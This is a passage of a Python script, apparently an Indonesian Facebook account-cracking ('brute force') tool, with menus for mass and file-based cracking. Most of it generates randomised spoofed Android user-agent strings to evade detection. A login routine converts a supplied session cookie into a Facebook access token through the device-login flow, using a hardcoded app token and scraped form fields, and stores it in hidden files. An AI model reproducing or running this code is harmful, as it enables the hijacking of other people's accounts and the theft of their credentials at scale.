	i=random.randrange(19, 500) 
	j='Mobile Safari/537.36'
	raf=f'{a} {b}.{c}.{d}; {e}{f}.{g}.{h}.{i} {j}'
	ugen.append(raf) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 15) 
	c=random.randrange(1, 9) 
	#d=random.randrange(1, 9) 
	e='P9000_MAX) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	f=random.randrange(10, 500) 
	g='0'
	h=random.randrange(10, 6000) 
	i=random.randrange(19, 500) 
	j='Mobile Safari/537.36'
	raf=f'{a} {b}.{c}; {e}{f}.{g}.{h}.{i} {j}'
	ugen.append(raf) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 15) 
	c=random.randrange(1, 9) 
	d=random.randrange(1, 9) 
	e='RNE-L21 Build/HUAWEIRNE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	f=random.randrange(10, 500) 
	g='0'
	h=random.randrange(10, 6000) 
	i=random.randrange(19, 500) 
	j='Mobile Safari/537.36 GSA/'+str(random.randrange(1, 100)) +'.'+str(random.randrange(10, 100))+'.'+str(random.randrange(1,100))+'.'+str(random.randrange(1, 100))+'.arm64'
	raf=f'{a} {b}.{c}.{d}; {e}{f}.{g}.{h}.{i} {j}'
	ugen.append(raf) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 15) 
	c=random.randrange(1, 9) 
	d=random.randrange(1, 9) 
	e='ATU-L31 Build/HUAWEIATU-L31; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	f=random.randrange(10, 600) 
	g='0'
	h=random.randrange(10, 7000) 
	i=random.randrange(10, 700) 
	j='Mobile Safari/537.36 GSA/'+str(random.randrange(1, 100)) +'.'+str(random.randrange(10, 100))+'.'+str(random.randrange(1,100))+'.'+str(random.randrange(1, 100))+'.arm64'
	raff=f'{a} {b}.{c}.{d}; {e}{f}.{g}.{h}.{i} {j}'
	ugen.append(raff) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(9, 15) 
	c='POT-LX3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=random.randrange(10, 500) 
	e='0'
	f=random.randrange(10, 6000) 
	g=random.randrange(19, 500) 
	h='Mobile Safari/537.36'
	raf=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
	ugen.append(raf) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(9, 15) 
	c='SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/11.1 Chrome/'
	d=random.randrange(10, 500) 
	e='0'
	f=random.randrange(10, 6000) 
	g=random.randrange(19, 500) 
	h='Mobile Safari/537.36'
	raf=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
	ugen.append(raf) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(9, 15) 
	c='Nokia 7.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=random.randrange(10, 500) 
	e='0'
	f=random.randrange(10, 6000) 
	g=random.randrange(19, 500) 
	h='Mobile Safari/537.36'
	raf=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
	ugen.append(raf) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 15) 
	c=random.randrange(1, 9) 
	d=random.randrange(1, 9) 
	e='SM-G930F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	f=random.randrange(10, 500) 
	g='0'
	h=random.randrange(10, 6000) 
	i=random.randrange(19, 500) 
	j='Mobile Safari/537.36'
	raf=f'{a} {b}.{c}.{d}; {e}{f}.{g}.{h}.{i} {j}'
	ugen.append(raf) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 15) 
	c=random.randrange(1, 9) 
	d=random.randrange(1, 9) 
	e='SM-J510FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	f=random.randrange(10, 500) 
	g='0'
	h=random.randrange(10, 6000) 
	i=random.randrange(19, 500) 
	j='Mobile Safari/537.36'
	raf=f'{a} {b}.{c}.{d}; {e}{f}.{g}.{h}.{i} {j}'
	ugen.append(raf) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 15) 
	c=random.randrange(1, 9) 
	d=random.randrange(1, 9) 
	e='G3116) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	f=random.randrange(10, 500) 
	g='0'
	h=random.randrange(10, 6000) 
	i=random.randrange(19, 500) 
	j='Mobile Safari/537.36'
	raf=f'{a} {b}.{c}.{d}; {e}{f}.{g}.{h}.{i} {j}'
	ugen.append(raf) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 15) 
	c=random.randrange(1, 9) 
	#d=random.randrange(1, 9) 
	e='BLN-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	f=random.randrange(10, 500) 
	g='0'
	h=random.randrange(10, 6000) 
	i=random.randrange(19, 500) 
	j='Mobile Safari/537.36'
	raf=f'{a} {b}.{c}; {e}{f}.{g}.{h}.{i} {j}'
	ugen.append(raf) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 15) 
	c=random.randrange(1, 9) 
	d=random.randrange(1, 9) 
	e='SM-G611F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	f=random.randrange(10, 500) 
	g='0'
	h=random.randrange(10, 6000) 
	i=random.randrange(19, 500) 
	j='Mobile Safari/537.36'
	raf=f'{a} {b}.{c}.{d}; {e}{f}.{g}.{h}.{i} {j}'
	ugen.append(raf) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(9, 15) 
	c='FIG-LX1 Build/HUAWEIFIG-L31; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(10, 500) 
	e='0'
	f=random.randrange(10, 6000) 
	g=random.randrange(19, 500) 
	h='Mobile Safari/537.36'
	raf=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
	ugen.append(raf) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 14) 
	c='RMX'
	d=str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9)) 
	e='AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/'
	f=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	g='Mobile Safari/537.36'
	uga=f'{a} {b}; {c}{d}) {e}{f} {g}'
	ugen.append(uga) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 14) 
	c='CPH'
	d=str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9)) 
	e='AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/'
	f=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	g='Mobile Safari/537.36'
	uga=f'{a} {b}; {c}{d}) {e}{f} {g}'
	ugen.append(uga) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 14) 
	c='vivo'
	d=str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9)) 
	e='AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/'
	f=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	g='Mobile Safari/537.36'
	uga=f'{a} {b}; {c} {d}) {e}{f} {g}'
	ugen.append(uga) 
	
	a=f'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
	b=f'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	c=random.randrange(30, 370) 
	d='0'
	e=random.randrange(30, 7000) 
	f=random.randrange(30, 277) 
	g=f'Safari/537.36 Agency/98.8.4537.38'
	roso=f'{a} {b}{c}.{d}.{e}.{f} {g}'
	ugen.append(roso) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(3, 15) 
	c='Nexus 6P Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=random.randrange(30, 275) 
	e='0'
	f=random.randrange(30, 7000) 
	g=random.randrange(10, 277) 
	h='Mobile Safari/537.36'
	surat=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
	ugen.append(surat) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='SM-A505F'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/537.36'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen.append(uaku)


	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='SM-A805F'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen2.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='SAMSUNG SM-F900U'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='SM-G975F'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='SM-N976V'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='SAMSUNG SM-G977N'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='SAMSUNG SM-F900U'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='SAMSUNG SM-J600G'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='SAMSUNG SM-J600G'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='SAMSUNG SM-J600G'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.4 Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='SAMSUNG SM-J600G'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
###----------[ WARNA PRINT RICH ]---------- ###
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH

M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
H3 = "[#FF00C0]" #ungu
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH
U2 = "[#AF00FF]" # UNGU
O2 = "[#FF8F00]" # ORANGE

###----------[ CEK WARNA TEMA ]---------- ###
try:
	file_color = open("data/theme_color","r").read()
	color_text = file_color.split("|")[0]
	color_panel = file_color.split("|")[1]
except:
	color_text = "[#00C8FF]"
	color_panel = "#00C8FF"
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,lisensiku,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[]
taplikasi=['no']
cokbrut=[]
method = []
pwpluss,pwnya=[],[]
CO="[#FFA300]"
SE="[#9F9F9F]"
CI = "[#FF8400]"
fak="[#FF9400]"
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
domris = random.choice(['bold blue','bold green','bold yellow'])

try:
	file_color = open("data/theme_color","r").read()
	color_text = file_color.split("|")[0]
	color_panel = file_color.split("|")[1]
except:
	color_text = "[#00FF00]"
	W1 = random.choice([M2,H2,K2])
	W2 = random.choice([K2,M2,K2])
	W3 = random.choice([H2,K2,M2])
	color_panel = "#00FF00"
	color_ok = "#00FF00"
	color_cp = "#FFFF00"
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

hour = datetime.datetime.now().hour
#--> Pengkondisian Jam Untuk Salam Harian
if hour < 4:
  hhl = f"Selamat Dini Hari"
elif 4 <= hour < 12:
  hhl = f"Selamat Pagi"
elif 12 <= hour < 15:
  hhl = "Selamat Pagi"
elif 15 <= hour < 17:
  hhl = f"Selamat Sore"
elif 17 <= hour < 18:
  hhl = f"Selamat Sore"
else:
  hhl = f"Selamat Malam"
#------------------[ MACHINE-SUPPORT ]---------------#
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	loginraf()
#------------------[ LOGO-LAKNAT ]-----------------#
def banner():
	clear()
	cetak(nel(f'''{P2} ____    __    ____    __  __  _  _  ____ 
{P2}(  _ \  /__\  ( ___)  (  \/  )( )/ )(_   )	THANKS TO = {K2}ALVINO ADIJAYA
{U2} )   / /(__)\  )__)    )    (  )  (  / /_ 	{P2}RECODE = {K2}RAF MKZ 
{U2}(_)\_)(__)(__)(__)    (_/\/\_)(_)\_)(____)
	{P2}TOOLS BFF MUSIM HUJAN''', width=79, style='dim')) 
#--------------------[ BAGIAN-MASUK ]--------------#
ply=[]
import requests,json,re
ses = requests.Session()
def loginraf():
	clear()
	banner()
	tree = Tree(' ')
	tree.add(f'{K2}1. {SE} CRACK NO LOGIN')
	tree.add(f'{K2}2. {SE} CRACK LOGIN COOKIE') 
   # tree.add(f'{h}2. {P} CRACK LOGIN COOKIE')
	tree.add(f'{K2}0. {SE} EXIT')
	cetak(nel(tree, width=79, title=f'{K2}MENU UTAMA', style=f"dim")) 
	ply = wa.input(f'{CO}[{H2}•{CO}] {SE}CHOICE : {K2}') 
	if ply in ['1','01']:
		lainnya()
	if ply in ['2','02']:
		login()
	elif ply in ['0','00']:
		exit()
	else :
		print(f'╰─ PILIH YG BENAR BANG')
		time.sleep(5)
		back()

def login():

	try:

		token = open('.token.txt','r').read()

		cok = open('.cok.txt','r').read()

		tokenku.append(token)

		try:

			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})

			sy2 = json.loads(sy.text)['name']

			sy3 = json.loads(sy.text)['id']

			menu(sy2,sy3)

		except KeyError:

			login_lagi334()

		except requests.exceptions.ConnectionError:

			li = ' ╰─  Problem Internet Connection, Check And Try Again'

			lo = mark(li, style='red')

			sol().print(lo, style='cyan')

			exit()

	except IOError:

		login_lagi334()

		

def login_lagi334():

	try:
#	        os.system('clear')
#	   	 
#                print(f'{P}JANGAN GUNAKAN AKUN PRIBADI') 
		banner()
		your_cookies = input(' ╰─  Masukan Cookie : ')

		with requests.Session() as r:

			try:

				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})

				data = {'access_token': '867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01','scope': ''}

				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)

				code, user_code = response['code'], response['user_code']

				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01&callback=LeetsharesCallback'.format(code))

				r.headers.pop('content-type')

				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})

				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text

				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):

					print(" ╰─  Cookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()

				else:

					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')

					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)

					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)

					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}

					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})

					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})

					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):

						r.headers.pop('content-type');r.headers.pop('origin')

						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text

						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')

						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)

						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)

						scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)

						display = re.search('name="display" value="(.*?)"', str(response4)).group(1)

						user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)

						logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)

						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)

						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)

						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)

						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})

						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}

						response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text

						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')

						r.headers.pop('content-type');r.headers.pop('origin')

						r.headers.update({'referer': 'https://m.facebook.com/',})

						response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text

						if 'Sukses!' in str(response6):

							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})

							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text

							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)

							print(f"\n {k}╰─  Token : {access_token}")

							tokenew = open(".token.txt","w").write(access_token)

							cook= open(".cok.txt","w").write(your_cookies)

							print("\n ╰─  Login Berhasil | Jalankan ulang Script nya");exit()

			except Exception as e:

				print(" ╰─  Cookies Mokad bang")

				os.system('rm -rf .token.txt && rm -rf .cok.txt')

				print(e)

				time.sleep(3)

				back()

	except:pass
#------------------[ BAGIAN-MENU ]----------------#
from rich.console import Console
from rich.table import Table
def menu(my_name,my_id):
	try:
		os.popen('play-audio /sdcard/ply.mp3') 
		cok = open('.cok.txt','r').read()
		token = open('.token.txt','r').read()
		
	except IOError:
		print('[×] Cookies Kadaluarsa ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	table=Table()
	kuda = Table(show_header=True, header_style='magenta') 
	table.add_column(f"[white]NO",justify="center",width=11,style="magenta")
	table.add_column(f"[white]MENU CRACK ",justify="center",width=36,style="magenta")
	table.add_column(f"[white]STATUS",justify="center",width=20,style="magenta")
	table.add_row("01",f"[white]CRACK PUBLIK","OFF",)
	table.add_row("02",f"[white]CRACK MASSAL","ONLINE")
	table.add_row("03",f"[white]CRACK FILE","ONLINE")
	table.add_row("04",f"[white]CLONE EMAIL","UPDATE")
	table.add_row("05",f"[white]CEK OPSI","ONLINE")
	table.add_row("06",f"[white]CEK RESULT","ONLINE")
	table.add_row("00",f"[white]KELUAR", "ONLINE") 
	Consol=Console()
